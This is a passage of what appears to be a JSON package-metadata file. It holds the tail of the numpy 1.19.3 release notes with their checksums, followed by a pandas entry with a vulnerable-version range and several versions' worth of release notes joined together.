total of 10 pull requests were merged for this release.\n\n* `17298 <https://github.com/numpy/numpy/pull/17298>`__: BLD: set upper versions for build dependencies\n* `17336 <https://github.com/numpy/numpy/pull/17336>`__: BUG: Set deprecated fields to null in PyArray_InitArrFuncs\n* `17446 <https://github.com/numpy/numpy/pull/17446>`__: ENH: Warn on unsupported Python 3.10+\n* `17450 <https://github.com/numpy/numpy/pull/17450>`__: MAINT: Update test_requirements.txt.\n* `17522 <https://github.com/numpy/numpy/pull/17522>`__: ENH: Support for the NVIDIA HPC SDK nvfortran compiler\n* `17568 <https://github.com/numpy/numpy/pull/17568>`__: BUG: Cygwin Workaround for #14787 on affected platforms\n* `17647 <https://github.com/numpy/numpy/pull/17647>`__: BUG: Fix memory leak of buffer-info cache due to relaxed strides\n* `17652 <https://github.com/numpy/numpy/pull/17652>`__: MAINT: Backport openblas_support from master.\n* `17653 <https://github.com/numpy/numpy/pull/17653>`__: TST: Add Python 3.9 to the CI testing on Windows, Mac.\n* `17660 <https://github.com/numpy/numpy/pull/17660>`__: TST: Simplify source path names in test_extending.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    e5c6c782b2f112c32dcc38242521ec83  numpy-1.19.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    02323e4a20e14e6f7cded1c55f6a0afe  numpy-1.19.3-cp36-cp36m-manylinux1_i686.whl\n    95f19f0b6c60a755a8454f22eb15f4d6  numpy-1.19.3-cp36-cp36m-manylinux1_x86_64.whl\n    e66cf5ea007a9b567be2b1a901b3d2e0  numpy-1.19.3-cp36-cp36m-manylinux2010_i686.whl\n    8c7d422f147392bd31f9e5bfc41a170e  numpy-1.19.3-cp36-cp36m-manylinux2010_x86_64.whl\n    da02c95dcf0acf7688aebaba7ba2750d  numpy-1.19.3-cp36-cp36m-manylinux2014_aarch64.whl\n    96e6ec05aca18516c8a5961c17a0cac6  numpy-1.19.3-cp36-cp36m-win32.whl\n    5aa36a829a7ce0a89e6fea502d4fa9ea  numpy-1.19.3-cp36-cp36m-win_amd64.whl\n    9143b46601bc0457dd42795a71ccd2f1  numpy-1.19.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    ebe09a5e206db0de65154ef75377f963  numpy-1.19.3-cp37-cp37m-manylinux1_i686.whl\n    96008f5c61368d4cd967ecd474525df6  numpy-1.19.3-cp37-cp37m-manylinux1_x86_64.whl\n    e61aaf0c971b667c5fed8b5de3773c6d  numpy-1.19.3-cp37-cp37m-manylinux2010_i686.whl\n    74a9f9dab6f00bcf56096eaa910c48b9  numpy-1.19.3-cp37-cp37m-manylinux2010_x86_64.whl\n    18d911f7f462ee98333de9579adde331  numpy-1.19.3-cp37-cp37m-manylinux2014_aarch64.whl\n    f29846178b82bd4e8db1685a6e911336  numpy-1.19.3-cp37-cp37m-win32.whl\n    d372be03d9e57e5e0e1372bf39391241  numpy-1.19.3-cp37-cp37m-win_amd64.whl\n    c64b6538e07bca9d84287eebb3f3a01b  numpy-1.19.3-cp38-cp38-macosx_10_9_x86_64.whl\n    8ac57941de395be58376611b211ea571  numpy-1.19.3-cp38-cp38-manylinux1_i686.whl\n    81cc1993ac8da61fea677a7eb49989e8  numpy-1.19.3-cp38-cp38-manylinux1_x86_64.whl\n    9b2b05db89068d1f3f32a231f3953355  numpy-1.19.3-cp38-cp38-manylinux2010_i686.whl\n    d26cfa5ad6f4aa6beb42246efc45f565  numpy-1.19.3-cp38-cp38-manylinux2010_x86_64.whl\n    969a13b40fceb950021e297d5427f329  numpy-1.19.3-cp38-cp38-manylinux2014_aarch64.whl\n    f978618640860e72b91c522f4e4085af  numpy-1.19.3-cp38-cp38-win32.whl\n    af140a06f216c4100dc93c4135003d10  numpy-1.19.3-cp38-cp38-win_amd64.whl\n    fda3cdf138516040cad3de66496cf670  numpy-1.19.3-cp39-cp39-macosx_10_9_x86_64.whl\n    f683469f18abc8c84aa831d9e78f4eb6  numpy-1.19.3-cp39-cp39-manylinux1_i686.whl\n    26414c3db751ca4735f744b239bf9703  numpy-1.19.3-cp39-cp39-manylinux1_x86_64.whl\n    3164ede05e3a5d28dd8bd66aee56928c  numpy-1.19.3-cp39-cp39-manylinux2010_i686.whl\n    fc0b0c73c5508247d21beb42cf3fff66  numpy-1.19.3-cp39-cp39-manylinux2010_x86_64.whl\n    75097b6e154469c63c50c8f7eaf52a89  numpy-1.19.3-cp39-cp39-manylinux2014_aarch64.whl\n    cd4363bde576c997bf737f420a85683a  numpy-1.19.3-cp39-cp39-win32.whl\n    54fa685b3d30585763f59a7b2be7279b  numpy-1.19.3-cp39-cp39-win_amd64.whl\n    ed5bd59a064fe5b95699c222dc7a4638  numpy-1.19.3-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    b2d13ca1b8ff89a9289174a86b835165  numpy-1.19.3.tar.gz\n    7f014f9964987b59083c8dc4d158d45a  numpy-1.19.3.zip\n\nSHA256\n------\n::\n\n    942d2cdcb362739908c26ce8dd88db6e139d3fa829dd7452dd9ff02cba6b58b2  numpy-1.19.3-cp36-cp36m-macosx_10_9_x86_64.whl\n    efd656893171bbf1331beca4ec9f2e74358fc732a2084f664fd149cc4b3441d2  numpy-1.19.3-cp36-cp36m-manylinux1_i686.whl\n    1a307bdd3dd444b1d0daa356b5f4c7de2e24d63bdc33ea13ff718b8ec4c6a268  numpy-1.19.3-cp36-cp36m-manylinux1_x86_64.whl\n    9d08d84bb4128abb9fbd9f073e5c69f70e5dab991a9c42e5b4081ea5b01b5db0  numpy-1.19.3-cp36-cp36m-manylinux2010_i686.whl\n    7197ee0a25629ed782c7bd01871ee40702ffeef35bc48004bc2fdcc71e29ba9d  numpy-1.19.3-cp36-cp36m-manylinux2010_x86_64.whl\n    8edc4d687a74d0a5f8b9b26532e860f4f85f56c400b3a98899fc44acb5e27add  numpy-1.19.3-cp36-cp36m-manylinux2014_aarch64.whl\n    522053b731e11329dd52d258ddf7de5288cae7418b55e4b7d32f0b7e31787e9d  numpy-1.19.3-cp36-cp36m-win32.whl\n    eefc13863bf01583a85e8c1121a901cc7cb8f059b960c4eba30901e2e6aba95f  numpy-1.19.3-cp36-cp36m-win_amd64.whl\n    6ff88bcf1872b79002569c63fe26cd2cda614e573c553c4d5b814fb5eb3d2822  numpy-1.19.3-cp37-cp37m-macosx_10_9_x86_64.whl\n    e080087148fd70469aade2abfeadee194357defd759f9b59b349c6192aba994c  numpy-1.19.3-cp37-cp37m-manylinux1_i686.whl\n    50f68ebc439821b826823a8da6caa79cd080dee2a6d5ab9f1163465a060495ed  numpy-1.19.3-cp37-cp37m-manylinux1_x86_64.whl\n    b9074d062d30c2779d8af587924f178a539edde5285d961d2dfbecbac9c4c931  numpy-1.19.3-cp37-cp37m-manylinux2010_i686.whl\n    463792a249a81b9eb2b63676347f996d3f0082c2666fd0604f4180d2e5445996  numpy-1.19.3-cp37-cp37m-manylinux2010_x86_64.whl\n    ea6171d2d8d648dee717457d0f75db49ad8c2f13100680e284d7becf3dc311a6  numpy-1.19.3-cp37-cp37m-manylinux2014_aarch64.whl\n    0ee77786eebbfa37f2141fd106b549d37c89207a0d01d8852fde1c82e9bfc0e7  numpy-1.19.3-cp37-cp37m-win32.whl\n    271139653e8b7a046d11a78c0d33bafbddd5c443a5b9119618d0652a4eb3a09f  numpy-1.19.3-cp37-cp37m-win_amd64.whl\n    e983cbabe10a8989333684c98fdc5dd2f28b236216981e0c26ed359aaa676772  numpy-1.19.3-cp38-cp38-macosx_10_9_x86_64.whl\n    d78294f1c20f366cde8a75167f822538a7252b6e8b9d6dbfb3bdab34e7c1929e  numpy-1.19.3-cp38-cp38-manylinux1_i686.whl\n    199bebc296bd8a5fc31c16f256ac873dd4d5b4928dfd50e6c4995570fc71a8f3  numpy-1.19.3-cp38-cp38-manylinux1_x86_64.whl\n    dffed17848e8b968d8d3692604e61881aa6ef1f8074c99e81647ac84f6038535  numpy-1.19.3-cp38-cp38-manylinux2010_i686.whl\n    5ea4401ada0d3988c263df85feb33818dc995abc85b8125f6ccb762009e7bc68  numpy-1.19.3-cp38-cp38-manylinux2010_x86_64.whl\n    604d2e5a31482a3ad2c88206efd43d6fcf666ada1f3188fd779b4917e49b7a98  numpy-1.19.3-cp38-cp38-manylinux2014_aarch64.whl\n    a2daea1cba83210c620e359de2861316f49cc7aea8e9a6979d6cb2ddab6dda8c  numpy-1.19.3-cp38-cp38-win32.whl\n    dfdc8b53aa9838b9d44ed785431ca47aa3efaa51d0d5dd9c412ab5247151a7c4  numpy-1.19.3-cp38-cp38-win_amd64.whl\n    9f7f56b5e85b08774939622b7d45a5d00ff511466522c44fc0756ac7692c00f2  numpy-1.19.3-cp39-cp39-macosx_10_9_x86_64.whl\n    8802d23e4895e0c65e418abe67cdf518aa5cbb976d97f42fd591f921d6dffad0  numpy-1.19.3-cp39-cp39-manylinux1_i686.whl\n    c4aa79993f5d856765819a3651117520e41ac3f89c3fc1cb6dee11aa562df6da  numpy-1.19.3-cp39-cp39-manylinux1_x86_64.whl\n    51e8d2ae7c7e985c7bebf218e56f72fa93c900ad0c8a7d9fbbbf362f45710f69  numpy-1.19.3-cp39-cp39-manylinux2010_i686.whl\n    50d3513469acf5b2c0406e822d3f314d7ac5788c2b438c24e5dd54d5a81ef522  numpy-1.19.3-cp39-cp39-manylinux2010_x86_64.whl\n    741d95eb2b505bb7a99fbf4be05fa69f466e240c2b4f2d3ddead4f1b5f82a5a5  numpy-1.19.3-cp39-cp39-manylinux2014_aarch64.whl\n    1ea7e859f16e72ab81ef20aae69216cfea870676347510da9244805ff9670170  numpy-1.19.3-cp39-cp39-win32.whl\n    83af653bb92d1e248ccf5fdb05ccc934c14b936bcfe9b917dc180d3f00250ac6  numpy-1.19.3-cp39-cp39-win_amd64.whl\n    9a0669787ba8c9d3bb5de5d9429208882fb47764aa79123af25c5edc4f5966b9  numpy-1.19.3-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    9179d259a9bc53ed7b153d31fc3156d1ca560d61079f53191cf177c3efc4a498  numpy-1.19.3.tar.gz\n    35bf5316af8dc7c7db1ad45bec603e5fb28671beb98ebd1d65e8059efcfd3b72  numpy-1.19.3.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n"}}, {"name": "pandas", "insecurity": ["<0.16.0rc1"], "changelog": {"0.20.0": "- Bug in :class:`SparseFrame` constructor where passing ``None`` as the data would cause ``default_fill_value`` to be ignored (:issue:`16807`)\n- Bug in :class:`SparseDataFrame` when adding a column in which the length of values does not match length of index, ``AssertionError`` is raised instead of raising ``ValueError`` (:issue:`25484`)\n- Introduce a better error message in :meth:`Series.sparse.from_coo` so it returns a ``TypeError`` for inputs that are not coo matrices (:issue:`26554`)\n- Bug in :func:`numpy.modf` on a :class:`SparseArray`. Now a tuple of :class:`SparseArray` is returned (:issue:`26946`).\n\n\nBuild changes\n^^^^^^^^^^^^^\n\n- Fix install error with PyPy on macOS (:issue:`26536`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Bug in :func:`factorize` when passing an ``ExtensionArray`` with a custom ``na_sentinel`` (:issue:`25696`).\n- :meth:`Series.count` miscounts NA values in ExtensionArrays (:issue:`26835`)\n- Added ``Series.__array_ufunc__`` to better handle NumPy ufuncs applied to Series backed by extension arrays (:issue:`23293`).\n- Keyword argument ``deep`` has been removed from :meth:`ExtensionArray.copy` (:issue:`27083`)\n\nOther\n^^^^^\n\n- Removed unused C functions from vendored UltraJSON implementation (:issue:`26198`)\n- Allow :class:`Index` and :class:`RangeIndex` to be passed to numpy ``min`` and ``max`` functions (:issue:`26125`)\n- Use actual class name in repr of empty objects of a ``Series`` subclass (:issue:`27001`).\n- Bug in :class:`DataFrame` where passing an object array of timezone-aware ``datetime`` objects would incorrectly raise ``ValueError`` (:issue:`13287`)\n\n.. _whatsnew_0.250.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.24.2..v0.25.0\n\n\n.. _whatsnew_0171:\n\nVersion 0.17.1 (November 21, 2015)\n----------------------------------\n\n{{ header }}\n\n\n.. note::\n\n   We are proud to announce that *pandas* has become a sponsored project of the (`NumFOCUS organization`_). This will help ensure the success of development of *pandas* as a world-class open-source project.\n\n.. _numfocus organization: http://www.numfocus.org/blog/numfocus-announces-new-fiscally-sponsored-project-pandas\n\nThis is a minor bug-fix release from 0.17.0 and includes a large number of\nbug fixes along several new features, enhancements, and performance improvements.\nWe recommend that all users upgrade to this version.\n\nHighlights include:\n\n- Support for Conditional HTML Formatting, see :ref:`here <whatsnew_0171.style>`\n- Releasing the GIL on the csv reader & other ops, see :ref:`here <whatsnew_0171.performance>`\n- Fixed regression in ``DataFrame.drop_duplicates`` from 0.16.2, causing incorrect results on integer values (:issue:`11376`)\n\n.. contents:: What's new in v0.17.1\n    :local:\n    :backlinks: none\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0171.style:\n\nConditional HTML formatting\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. warning::\n    This is a new feature and is under active development.\n    We'll be adding features an  possibly making breaking changes in future\n    releases. Feedback is welcome in :issue:`11610`\n\nWe've added *experimental* support for conditional HTML formatting:\nthe visual styling of a DataFrame based on the data.\nThe styling is accomplished with HTML and CSS.\nAccesses the styler class with the :attr:`pandas.DataFrame.style`, attribute,\nan instance of :class:`.Styler` with your data attached.\n\nHere's a quick example:\n\n  .. ipython:: python\n\n    np.random.seed(123)\n    df = pd.DataFrame(np.random.randn(10, 5), columns=list(\"abcde\"))\n    html = df.style.background_gradient(cmap=\"viridis\", low=0.5)\n\nWe can render the HTML to get the following table.\n\n.. raw:: html\n   :file: whatsnew_0171_html_table.html\n\n:class:`.Styler` interacts nicely with the Jupyter Notebook.\nSee the :ref:`documentation </user_guide/style.ipynb>` for more.\n\n.. _whatsnew_0171.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n- ``DatetimeIndex`` now supports conversion to strings with ``astype(str)`` (:issue:`10442`)\n- Support for ``compression`` (gzip/bz2) in :meth:`pandas.DataFrame.to_csv` (:issue:`7615`)\n- ``pd.read_*`` functions can now also accept :class:`python:pathlib.Path`, or :class:`py:py._path.local.LocalPath`\n  objects for the ``filepath_or_buffer`` argument. (:issue:`11033`)\n  - The ``DataFrame`` and ``Series`` functions ``.to_csv()``, ``.to_html()`` and ``.to_latex()`` can now handle paths beginning with tildes (e.g. ``~/Documents/``) (:issue:`11438`)\n- ``DataFrame`` now uses the fields of a ``namedtuple`` as columns, if columns are not supplied (:issue:`11181`)\n- ``DataFrame.itertuples()`` now returns ``namedtuple`` objects, when possible. (:issue:`11269`, :issue:`11625`)\n- Added ``axvlines_kwds`` to parallel coordinates plot (:issue:`10709`)\n- Option to ``.info()`` and ``.memory_usage()`` to provide for deep introspection of memory consumption. Note that this can be expensive to compute and therefore is an optional parameter. (:issue:`11595`)\n\n  .. ipython:: python\n\n     df = pd.DataFrame({\"A\": [\"foo\"] * 1000})   noqa: F821\n     df[\"B\"] = df[\"A\"].astype(\"category\")\n\n      shows the '+' as we have object dtypes\n     df.info()\n\n      we have an accurate memory assessment (but can be expensive to compute this)\n     df.info(memory_usage=\"deep\")\n\n- ``Index`` now has a ``fillna`` method (:issue:`10089`)\n\n  .. ipython:: python\n\n     pd.Index([1, np.nan, 3]).fillna(2)\n\n- Series of type ``category`` now make ``.str.<...>`` and ``.dt.<...>`` accessor methods / properties available, if the categories are of that type. (:issue:`10661`)\n\n  .. ipython:: python\n\n     s = pd.Series(list(\"aabb\")).astype(\"category\")\n     s\n     s.str.contains(\"a\")\n\n     date = pd.Series(pd.date_range(\"1/1/2015\", periods=5)).astype(\"category\")\n     date\n     date.dt.day\n\n- ``pivot_table`` now has a ``margins_name`` argument so you can use something other than the default of 'All' (:issue:`3335`)\n- Implement export of ``datetime64[ns, tz]`` dtypes with a fixed HDF5 store (:issue:`11411`)\n- Pretty printing sets (e.g. in DataFrame cells) now uses set literal syntax (``{x, y}``) instead of\n  Legacy Python syntax (``set([x, y])``) (:issue:`11215`)\n- Improve the error message in :func:`pandas.io.gbq.to_gbq` when a streaming insert fails (:issue:`11285`)\n  and when the DataFrame does not match the schema of the destination table (:issue:`11359`)\n\n.. _whatsnew_0171.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- raise ``NotImplementedError`` in ``Index.shift`` for non-supported index types (:issue:`8038`)\n- ``min`` and ``max`` reductions on ``datetime64`` and ``timedelta64`` dtyped series now\n  result in ``NaT`` and not ``nan`` (:issue:`11245`).\n- Indexing with a null key will raise a ``TypeError``, instead of a ``ValueError`` (:issue:`11356`)\n- ``Series.ptp`` will now ignore missing values by default (:issue:`11163`)\n\n.. _whatsnew_0171.deprecations:\n\nDeprecations\n^^^^^^^^^^^^\n\n- The ``pandas.io.ga`` module which implements ``google-analytics`` support is deprecated and will be removed in a future version (:issue:`11308`)\n- Deprecate the ``engine`` keyword in ``.to_csv()``, which will be removed in a future version (:issue:`11274`)\n\n.. _whatsnew_0171.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Checking monotonic-ness before sorting on an index (:issue:`11080`)\n- ``Series.dropna`` performance improvement when its dtype can't contain ``NaN`` (:issue:`11159`)\n- Release the GIL on most datetime field operations (e.g. ``DatetimeIndex.year``, ``Series.dt.year``), normalization, and conversion to and from ``Period``, ``DatetimeIndex.to_period`` and ``PeriodIndex.to_timestamp`` (:issue:`11263`)\n- Release the GIL on some rolling algos: ``rolling_median``, ``rolling_mean``, ``rolling_max``, ``rolling_min``, ``rolling_var``, ``rolling_kurt``, ``rolling_skew`` (:issue:`11450`)\n- Release the GIL when reading and parsing text files in ``read_csv``, ``read_table`` (:issue:`11272`)\n- Improved performance of ``rolling_median`` (:issue:`11450`)\n- Improved performance of ``to_excel`` (:issue:`11352`)\n- Performance bug in repr of ``Categorical`` categories, which was rendering the strings before chopping them for display (:issue:`11305`)\n- Performance improvement in ``Categorical.remove_unused_categories``, (:issue:`11643`).\n- Improved performance of ``Series`` constructor with no data and ``DatetimeIndex`` (:issue:`11433`)\n- Improved performance of ``shift``, ``cumprod``, and ``cumsum`` with groupby (:issue:`4095`)\n\n.. _whatsnew_0171.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- ``SparseArray.__iter__()`` now does not cause ``PendingDeprecationWarning`` in Python 3.5 (:issue:`11622`)\n- Regression from 0.16.2 for output formatting of long floats/nan, restored in (:issue:`11302`)\n- ``Series.sort_index()`` now correctly handles the ``inplace`` option (:issue:`11402`)\n- Incorrectly distributed .c file in the build on ``PyPi`` when reading a csv of floats and passing ``na_values=<a scalar>`` would show an exception (:issue:`11374`)\n- Bug in ``.to_latex()`` output broken when the index has a name (:issue:`10660`)\n- Bug in ``HDFStore.append`` with strings whose encoded length exceeded the max unencoded length (:issue:`11234`)\n- Bug in merging ``datetime64[ns, tz]`` dtypes (:issue:`11405`)\n- Bug in ``HDFStore.select`` when comparing with a numpy scalar in a where clause (:issue:`11283`)\n- Bug in using ``DataFrame.ix`` with a MultiIndex indexer (:issue:`11372`)\n- Bug in ``date_range`` with ambiguous endpoints (:issue:`11626`)\n- Prevent adding new attributes to the accessors ``.str``, ``.dt`` and ``.cat``. Retrieving such\n  a value was not possible, so error out on setting it. (:issue:`10673`)\n- Bug in tz-conversions with an ambiguous time and ``.dt`` accessors (:issue:`11295`)\n- Bug in output formatting when using an index of ambiguous times (:issue:`11619`)\n- Bug in comparisons of Series vs list-likes (:issue:`11339`)\n- Bug in ``DataFrame.replace`` with a ``datetime64[ns, tz]`` and a non-compat to_replace (:issue:`11326`, :issue:`11153`)\n- Bug in ``isnull`` where ``numpy.datetime64('NaT')`` in a ``numpy.array`` was not determined to be null(:issue:`11206`)\n- Bug in list-like indexing with a mixed-integer Index (:issue:`11320`)\n- Bug in ``pivot_table`` with ``margins=True`` when indexes are of ``Categorical`` dtype (:issue:`10993`)\n- Bug in ``DataFrame.plot`` cannot use hex strings colors (:issue:`10299`)\n- Regression in ``DataFrame.drop_duplicates`` from 0.16.2, causing incorrect results on integer values (:issue:`11376`)\n- Bug in ``pd.eval`` where unary ops in a list error (:issue:`11235`)\n- Bug in ``squeeze()`` with zero length arrays (:issue:`11230`, :issue:`8999`)\n- Bug in ``describe()`` dropping column names for hierarchical indexes (:issue:`11517`)\n- Bug in ``DataFrame.pct_change()`` not propagating ``axis`` keyword on ``.fillna`` method (:issue:`11150`)\n- Bug in ``.to_csv()`` when a mix of integer and string column names are passed as the ``columns`` parameter (:issue:`11637`)\n- Bug in indexing with a ``range``, (:issue:`11652`)\n- Bug in inference of numpy scalars and preserving dtype when setting columns (:issue:`11638`)\n- Bug in ``to_sql`` using unicode column names giving UnicodeEncodeError with (:issue:`11431`).\n- Fix regression in setting of ``xticks`` in ``plot`` (:issue:`11529`).\n- Bug in ``holiday.dates`` where observance rules could not be applied to holiday and doc enhancement (:issue:`11477`, :issue:`11533`)\n- Fix plotting issues when having plain ``Axes`` instances instead of ``SubplotAxes`` (:issue:`11520`, :issue:`11556`).\n- Bug in ``DataFrame.to_latex()`` produces an extra rule when ``header=False`` (:issue:`7124`)\n- Bug in ``df.groupby(...).apply(func)`` when a func returns a ``Series`` containing a new datetimelike column (:issue:`11324`)\n- Bug in ``pandas.json`` when file to load is big (:issue:`11344`)\n- Bugs in ``to_excel`` with duplicate columns (:issue:`11007`, :issue:`10982`, :issue:`10970`)\n- Fixed a bug that prevented the construction of an empty series of dtype ``datetime64[ns, tz]`` (:issue:`11245`).\n- Bug in ``read_excel`` with MultiIndex containing integers (:issue:`11317`)\n- Bug in ``to_excel`` with openpyxl 2.2+ and merging (:issue:`11408`)\n- Bug in ``DataFrame.to_dict()`` produces a ``np.datetime64`` object instead of ``Timestamp`` when only datetime is present in data (:issue:`11327`)\n- Bug in ``DataFrame.corr()`` raises exception when computes Kendall correlation for DataFrames with boolean and not boolean columns (:issue:`11560`)\n- Bug in the link-time error caused by C ``inline`` functions on FreeBSD 10+ (with ``clang``) (:issue:`10510`)\n- Bug in ``DataFrame.to_csv`` in passing through arguments for formatting ``MultiIndexes``, including ``date_format`` (:issue:`7791`)\n- Bug in ``DataFrame.join()`` with ``how='right'`` producing a ``TypeError`` (:issue:`11519`)\n- Bug in ``Series.quantile`` with empty list results has ``Index`` with ``object`` dtype (:issue:`11588`)\n- Bug in ``pd.merge`` results in empty ``Int64Index`` rather than ``Index(dtype=object)`` when the merge result is empty (:issue:`11588`)\n- Bug in ``Categorical.remove_unused_categories`` when having ``NaN`` values (:issue:`11599`)\n- Bug in ``DataFrame.to_sparse()`` loses column names for MultiIndexes (:issue:`11600`)\n- Bug in ``DataFrame.round()`` with non-unique column index producing a Fatal Python error (:issue:`11611`)\n- Bug in ``DataFrame.round()`` with ``decimals`` being a non-unique indexed Series producing extra columns (:issue:`11618`)\n\n\n.. _whatsnew_0.17.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.17.0..v0.17.1\n\n\n.. _whatsnew_113:\n\nWhat's new in 1.1.3 (October 5, 2020)\n-------------------------------------\n\nThese are the changes in pandas 1.1.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\nAdded support for new Python version\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.1.3 now supports Python 3.9 (:issue:`36296`).\n\nDevelopment Changes\n^^^^^^^^^^^^^^^^^^^\n\n- The minimum version of Cython is now the most recent bug-fix version (0.29.21) (:issue:`36296`).\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.agg`, :meth:`DataFrame.apply`, :meth:`Series.agg`, and :meth:`Series.apply` where internal suffix is exposed to the users when no relabelling is applied (:issue:`36189`)\n- Fixed regression in :class:`IntegerArray` unary plus and minus operations raising a ``TypeError`` (:issue:`36063`)\n- Fixed regression when adding a :meth:`timedelta_range` to a :class:`Timestamp` raised a ``ValueError`` (:issue:`35897`)\n- Fixed regression in :meth:`Series.__getitem__` incorrectly raising when the input was a tuple (:issue:`35534`)\n- Fixed regression in :meth:`Series.__getitem__` incorrectly raising when the input was a frozenset (:issue:`35747`)\n- Fixed regression in modulo of :class:`Index`, :class:`Series` and :class:`DataFrame` using ``numexpr`` using C not Python semantics (:issue:`36047`, :issue:`36526`)\n- Fixed regression in :meth:`read_excel` with ``engine=\"odf\"`` caused ``UnboundLocalError`` in some cases where cells had nested child nodes (:issue:`36122`, :issue:`35802`)\n- Fixed regression in :meth:`DataFrame.replace` inconsistent replace when using a float in the replace method (:issue:`35376`)\n- Fixed regression in :meth:`Series.loc` on a :class:`Series` with a :class:`MultiIndex` containing :class:`Timestamp` raising ``InvalidIndexError`` (:issue:`35858`)\n- Fixed regression in :class:`DataFrame` and :class:`Series` comparisons between numeric arrays and strings (:issue:`35700`, :issue:`36377`)\n- Fixed regression in :meth:`DataFrame.apply` with ``raw=True`` and user-function returning string (:issue:`35940`)\n- Fixed regression when setting empty :class:`DataFrame` column to a :class:`Series` in preserving name of index in frame (:issue:`36527`)\n- Fixed regression in :class:`Period` incorrect value for ordinal over the maximum timestamp (:issue:`36430`)\n- Fixed regression in :func:`read_table` raised ``ValueError`` when ``delim_whitespace`` was set to ``True`` (:issue:`35958`)\n- Fixed regression in :meth:`Series.dt.normalize` when normalizing pre-epoch dates the result was shifted one day (:issue:`36294`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`read_spss` where passing a ``pathlib.Path`` as ``path`` would raise a ``TypeError`` (:issue:`33666`)\n- Bug in :meth:`Series.str.startswith` and :meth:`Series.str.endswith` with ``category`` dtype not propagating ``na`` parameter (:issue:`36241`)\n- Bug in :class:`Series` constructor where integer overflow would occur for sufficiently large scalar inputs when an index was provided (:issue:`36291`)\n- Bug in :meth:`DataFrame.sort_values` raising an ``AttributeError`` when sorting on a key that casts column to categorical dtype (:issue:`36383`)\n- Bug in :meth:`DataFrame.stack` raising a ``ValueError`` when stacking :class:`MultiIndex` columns based on position when the levels had duplicate names (:issue:`36353`)\n- Bug in :meth:`Series.astype` showing too much precision when casting from ``np.float32`` to string dtype (:issue:`36451`)\n- Bug in :meth:`Series.isin` and :meth:`DataFrame.isin` when using ``NaN`` and a row length above 1,000,000 (:issue:`22205`)\n- Bug in :func:`cut` raising a ``ValueError`` when passed a :class:`Series` of labels with ``ordered=False`` (:issue:`36603`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.other:\n\nOther\n~~~~~\n- Reverted enhancement added in pandas-1.1.0 where :func:`timedelta_range` infers a frequency when passed ``start``, ``stop``, and ``periods`` (:issue:`32377`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_113.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.2..v1.1.3\n\n\n.. _whatsnew_0150:\n\nVersion 0.15.0 (October 18, 2014)\n---------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.14.1 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n.. warning::\n\n   pandas >= 0.15.0 will no longer support compatibility with NumPy versions <\n   1.7.0. If you want to use the latest versions of pandas, please upgrade to\n   NumPy >= 1.7.0 (:issue:`7711`)\n\n- Highlights include:\n\n  - The ``Categorical`` type was integrated as a first-class pandas type, see :ref:`here <whatsnew_0150.cat>`\n  - New scalar type ``Timedelta``, and a new index type ``TimedeltaIndex``, see :ref:`here <whatsnew_0150.timedeltaindex>`\n  - New datetimelike properties accessor ``.dt`` for Series, see :ref:`Datetimelike Properties <whatsnew_0150.dt>`\n  - New DataFrame default display for ``df.info()`` to include memory usage, see :ref:`Memory Usage <whatsnew_0150.memory>`\n  - ``read_csv`` will now by default ignore blank lines when parsing, see :ref:`here <whatsnew_0150.blanklines>`\n  - API change in using Indexes in set operations, see :ref:`here <whatsnew_0150.index_set_ops>`\n  - Enhancements in the handling of timezones, see :ref:`here <whatsnew_0150.tz>`\n  - A lot of improvements to the rolling and expanding moment functions, see :ref:`here <whatsnew_0150.roll>`\n  - Internal refactoring of the ``Index`` class to no longer sub-class ``ndarray``, see :ref:`Internal Refactoring <whatsnew_0150.refactoring>`\n  - dropping support for ``PyTables`` less than version 3.0.0, and ``numexpr`` less than version 2.1 (:issue:`7990`)\n  - Split indexing documentation into :ref:`Indexing and Selecting Data <indexing>` and :ref:`MultiIndex / Advanced Indexing <advanced>`\n  - Split out string methods documentation into :ref:`Working with Text Data <text>`\n\n- Check the :ref:`API Changes <whatsnew_0150.api>` and :ref:`deprecations <whatsnew_0150.deprecations>` before updating\n\n- :ref:`Other Enhancements <whatsnew_0150.enhancements>`\n\n- :ref:`Performance Improvements <whatsnew_0150.performance>`\n\n- :ref:`Bug Fixes <whatsnew_0150.bug_fixes>`\n\n.. warning::\n\n   In 0.15.0 ``Index`` has internally been refactored to no longer sub-class ``ndarray``\n   but instead subclass ``PandasObject``, similarly to the rest of the pandas objects. This change allows very easy sub-classing and creation of new index types. This should be\n   a transparent change with only very limited API implications (See the :ref:`Internal Refactoring <whatsnew_0150.refactoring>`)\n\n.. warning::\n\n   The refactoring in :class:`~pandas.Categorical` changed the two argument constructor from\n   \"codes/labels and levels\" to \"values and levels (now called 'categories')\". This can lead to subtle bugs. If you use\n   :class:`~pandas.Categorical` directly, please audit your code before updating to this pandas\n   version and change it to use the :meth:`~pandas.Categorical.from_codes` constructor. See more on ``Categorical`` :ref:`here <whatsnew_0150.cat>`\n\n\nNew 